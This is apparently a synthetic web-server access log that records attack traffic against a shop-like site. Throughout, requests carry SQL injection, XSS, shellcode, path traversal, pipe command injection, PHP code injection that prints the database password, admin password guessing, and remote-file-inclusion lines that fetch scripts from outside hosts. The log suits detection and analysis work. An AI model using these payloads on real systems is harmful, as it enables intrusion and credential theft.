87.251.81.179 - - [18/May/2019:03:12:11 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.0" 200 12155 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:11 +0200] "GET /index.php/?username=admin&password=admin2 HTTP/1.0" 200 84950 "/index.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:16 +0200] "GET /authorize.php/.env/README.txt HTTP/1.0" 200 72517 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:12:17 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.1" 200 10765 "/orders.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:12:17 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.1" 200 36670 "/orders.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:12:17 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.1" 200 22613 "/orders.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:12:17 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.1" 200 31684 "/orders.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:12:17 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.1" 200 12116 "/orders.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
121.225.26.201 - - [18/May/2019:03:12:22 +0200] "GET /index.php/ HTTP/1.0" 200 71241 "/api/v1/customers/" "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
121.225.26.201 - - [18/May/2019:03:12:23 +0200] "GET /?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 41588 "/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:12:24 +0200] "GET /core/files/js/editor.js/?username=admin&password=admin2 HTTP/1.0" 200 85603 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:24 +0200] "GET /core/files/js/editor.js/?username=admin&password=admin2 HTTP/1.0" 200 35608 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:24 +0200] "GET /core/files/js/editor.js/?username=admin&password=admin2 HTTP/1.0" 200 24926 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:24 +0200] "GET /core/files/js/editor.js/?username=admin&password=admin2 HTTP/1.0" 200 45242 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:12:24 +0200] "GET /core/files/js/editor.js/?username=admin&password=admin2 HTTP/1.0" 200 40310 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:12:29 +0200] "GET /login.php/?post=%3script%3ealert(1); HTTP/1.0" 403 69273 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
209.133.212.79 - - [18/May/2019:03:12:30 +0200] "GET /api/v1/register/?post=%3script%3ealert(1); HTTP/1.0" 200 5682 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
39.36.99.88 - - [18/May/2019:03:12:31 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 47559 "/api/v1/login/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
183.87.255.54 - - [18/May/2019:03:12:32 +0200] "GET /register.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 200 60101 "/blog/our-proposals/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:12:32 +0200] "GET /register.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 200 88893 "/blog/our-proposals/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:12:32 +0200] "GET /register.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 200 39640 "/blog/our-proposals/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:12:32 +0200] "GET /register.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 200 27893 "/blog/our-proposals/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:12:32 +0200] "GET /register.php/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 200 3054 "/blog/our-proposals/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:12:37 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 22561 "/api/v1/login/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
121.225.26.201 - - [18/May/2019:03:12:38 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 404 23005 "/orders.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:12:39 +0200] "GET /core/files/js/upload.js/.env/README.txt HTTP/1.0" 404 18706 "/api/v1/customers/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
62.109.16.162 - - [18/May/2019:03:12:40 +0200] "GET /core/files/js/editor.js/?file=http://evil.eu/sh HTTP/1.0" 200 72914 "/api/v1/login/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
121.225.26.201 - - [18/May/2019:03:12:41 +0200] "POST /?post=%3script%3ealert(1); HTTP/1.1" 200 16379 "/" "Mozilla/5.0 (Windows NT 6.2; rv:43.0) Gecko/20100101 Firefox/43.0"
220.243.135.5 - - [18/May/2019:03:12:42 +0200] "GET /index.php/?username=admin&password=1239 HTTP/1.0" 200 16205 "/login.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:12:43 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 20946 "/api/v1/orders/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:12:43 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 81759 "/api/v1/orders/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:12:43 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 26254 "/api/v1/orders/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:12:43 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 62345 "/api/v1/orders/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:12:43 +0200] "GET /?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 27509 "/api/v1/orders/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
5.13.35.65 - - [18/May/2019:03:12:48 +0200] "GET /api/v1/login/?username=admin&password=1235 HTTP/1.0" 200 75124 "/authorize.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
5.13.35.65 - - [18/May/2019:03:12:49 +0200] "GET /api/v1/orders/?user=admin&amount=100000 HTTP/1.0" 200 40652 "/index.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
62.109.16.162 - - [18/May/2019:03:12:50 +0200] "GET /core/files/js/upload.js/?file=http://evil.eu/sh HTTP/1.0" 200 45999 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:12:51 +0200] "GET /orders.php/?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 45588 "/connection.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
103.36.79.144 - - [18/May/2019:03:12:52 +0200] "GET /api/v1/login/?username=admin&password=1234 HTTP/1.0" 200 83616 "/index.php/" "Mozilla/5.0 (Linux; Android 4.1.2; GT-I9100 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
62.109.16.162 - - [18/May/2019:03:12:53 +0200] "GET /connection.php/.env/README.txt HTTP/1.0" 504 68966 "/" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0 Seamonkey/2.33.1"
220.243.135.5 - - [18/May/2019:03:12:54 +0200] "GET /orders.php/ HTTP/1.0" 400 15413 "/connection.php/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:12:55 +0200] "GET /?username=admin&password=admin2 HTTP/1.0" 503 2598 "/index.php/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
220.243.135.5 - - [18/May/2019:03:12:56 +0200] "GET /?userid=bob%27%3b%20update%20logintable%20set%20passwd%3d%270wn3d%27%3b--%00 HTTP/1.0" 200 66934 "/index.php/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
115.221.121.44 - - [18/May/2019:03:12:57 +0200] "GET /orders.php/%u0061?[buffer]=89898 HTTP/1.0" 200 40610 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:12:58 +0200] "GET /?id=0%20or%201=1 HTTP/1.0" 200 4802 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:12:59 +0200] "GET /api/v1/customers/?id=0%20or%201=1 HTTP/1.0" 200 87452 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:13:00 +0200] "GET /api/v1/register/?customerId=1OR%201=1 HTTP/1.1" 200 62447 "/login.php/" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:25.0) Gecko/20141021 Firefox/24.9 PaleMoon/25.0.2"
220.243.135.5 - - [18/May/2019:03:13:01 +0200] "GET /update.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 54685 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:01 +0200] "GET /update.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 86746 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:01 +0200] "GET /update.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 48459 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:01 +0200] "GET /update.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 17180 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:01 +0200] "GET /update.php/?page=1&customerId=AND%id%IS%NULL; HTTP/1.0" 404 5602 "/index.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
45.61.164.120 - - [18/May/2019:03:13:06 +0200] "GET /%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 76196 "/connection.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
31.184.238.22 - - [18/May/2019:03:13:07 +0200] "GET /core/files/js/editor.js/?data=oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00oo00 HTTP/1.0" 200 26851 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0 Iceweasel/41.0"
62.109.16.162 - - [18/May/2019:03:13:08 +0200] "GET /api/v1/login/?username=admin&password=1237 HTTP/1.0" 200 57521 "/api/v1/register/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
121.225.26.201 - - [18/May/2019:03:13:09 +0200] "GET /index.php/?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.0" 404 1761 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:13:10 +0200] "GET /index.php/?post==<?php print $settings[database][password]; ?> HTTP/1.1" 200 24760 "/index.php/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:42.0) Gecko/20100101 Firefox/42.0"
220.243.135.5 - - [18/May/2019:03:13:11 +0200] "GET /api/v1/login/?username=admin&password=1236 HTTP/1.0" 403 52681 "/register.php/" "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/43.0.2357.61 Mobile/12F70 Safari/600.1.4"
45.61.164.120 - - [18/May/2019:03:13:12 +0200] "GET /core/themes/theme.inc/?post=%3script%3ealert(1); HTTP/1.0" 403 6494 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:13 +0200] "GET / HTTP/1.0" 504 9643 "/api/v1/orders/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:13:14 +0200] "GET /api/v1/register/ HTTP/1.0" 200 42424 "/api/v1/register/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
121.225.26.201 - - [18/May/2019:03:13:15 +0200] "GET / HTTP/1.0" 200 45131 "/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:13:16 +0200] "GET /?username=admin&password=1239 HTTP/1.0" 200 63374 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
87.251.81.179 - - [18/May/2019:03:13:17 +0200] "GET /?username=admin&password=1237 HTTP/1.1" 200 74889 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
31.184.238.22 - - [18/May/2019:03:13:18 +0200] "GET /xmlrpc.php/%2e%2e%2f%2e%2e%2f%2e%2e%2f/bin/bashhttp%3a%2f%2fwww.dvvv23.cin%2fscript.sh HTTP/1.0" 200 66823 "/" "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
182.34.27.162 - - [18/May/2019:03:13:19 +0200] "GET /index.php/?file=http://evil.eu/sh HTTP/1.0" 404 7113 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
1.2.169.95 - - [18/May/2019:03:13:20 +0200] "GET / HTTP/1.0" 404 89769 "/index.php/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
220.243.135.5 - - [18/May/2019:03:13:21 +0200] "GET /login.php/ HTTP/1.0" 200 27284 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:21 +0200] "GET /login.php/ HTTP/1.0" 200 71364 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:21 +0200] "GET /login.php/ HTTP/1.0" 200 49558 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:21 +0200] "GET /login.php/ HTTP/1.0" 200 6067 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:21 +0200] "GET /login.php/ HTTP/1.0" 200 8070 "/login.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
54.36.149.52 - - [18/May/2019:03:13:26 +0200] "GET / HTTP/1.0" 200 12497 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
103.36.79.144 - - [18/May/2019:03:13:27 +0200] "GET / HTTP/1.0" 200 72368 "/login.php/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
87.251.81.179 - - [18/May/2019:03:13:28 +0200] "POST /login.php/ HTTP/1.0" 200 30040 "/api/v1/register/" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
182.34.27.162 - - [18/May/2019:03:13:29 +0200] "GET /api/v1/register/ HTTP/1.0" 200 16510 "/index.php/" "Mozilla/5.0 (X11; OpenBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"
5.13.35.65 - - [18/May/2019:03:13:30 +0200] "GET / HTTP/1.0" 404 42311 "/core/files/js/editor.js/" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:13:31 +0200] "GET /api/v1/customers/ HTTP/1.0" 404 81118 "/api/v1/customers/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.21 (KHTML, like Gecko) konqueror/4.14.2 Safari/537.21"
209.133.212.79 - - [18/May/2019:03:13:32 +0200] "GET /index.php/ HTTP/1.0" 200 87435 "/" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
220.243.135.5 - - [18/May/2019:03:13:33 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 403 8637 "/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
121.225.26.201 - - [18/May/2019:03:13:34 +0200] "GET /?username=admin&password=admin HTTP/1.0" 400 37066 "/login.php/" "Mozilla/5.0 (Windows NT 6.1; rv:42.0) Gecko/20100101 Firefox/42.0"
209.133.212.79 - - [18/May/2019:03:13:35 +0200] "GET /api/v1/register/?ip=|+ls+-l HTTP/1.0" 200 49122 "/" "Mozilla/5.0 (Linux; Android 5.0; Nexus 4 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.59 Mobile Safari/537.36"
39.36.99.88 - - [18/May/2019:03:13:36 +0200] "GET /api/v1/login/?file=http://evil.eu/sh HTTP/1.0" 404 42390 "/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36"
220.243.135.5 - - [18/May/2019:03:13:37 +0200] "GET /?post=%3script%3ealert(1); HTTP/1.0" 200 76042 "/index.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
183.87.255.54 - - [18/May/2019:03:13:38 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 87063 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:13:38 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 39985 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:13:38 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 15035 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:13:38 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 31816 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
183.87.255.54 - - [18/May/2019:03:13:38 +0200] "GET /core/files/js/editor.js/ HTTP/1.0" 200 57153 "/api/v1/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
182.34.27.162 - - [18/May/2019:03:13:43 +0200] "GET /index.php/?username=admin&password=1236 HTTP/1.0" 200 6806 "/login.php/" "Mozilla/5.0 (X11; Linux i686) AppleWebKit/538.15 (KHTML, like Gecko) Version/8.0 Safari/538.15 Ubuntu/14.10 (3.10.3-0ubuntu3) Epiphany/3.10.3"
5.13.35.65 - - [18/May/2019:03:13:44 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 50381 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
5.13.35.65 - - [18/May/2019:03:13:44 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 14605 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
5.13.35.65 - - [18/May/2019:03:13:44 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 45290 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
5.13.35.65 - - [18/May/2019:03:13:44 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 44446 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
5.13.35.65 - - [18/May/2019:03:13:44 +0200] "GET /login.php/?form=\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00\x80\xe8\xdc\xff\xff\xff/bin/sh HTTP/1.0" 200 65618 "/core/files/js/upload.js/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.21 (KHTML, like Gecko) rekonq/2.4.2 Safari/537.21"
62.109.16.162 - - [18/May/2019:03:13:49 +0200] "GET /blog/how-to-shop/?file=http://evil.eu/sh HTTP/1.0" 200 25424 "/core/files/js/upload.js/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.2357.125 Safari/537.36"
54.36.149.94 - - [18/May/2019:03:13:50 +0200] "GET /index.php/?session=vwdefcwec334scfdjr49ccededfewsd HTTP/1.1" 200 10591 "/" "Mozilla/5.0 (X11; FreeBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.125 Safari/537.36"
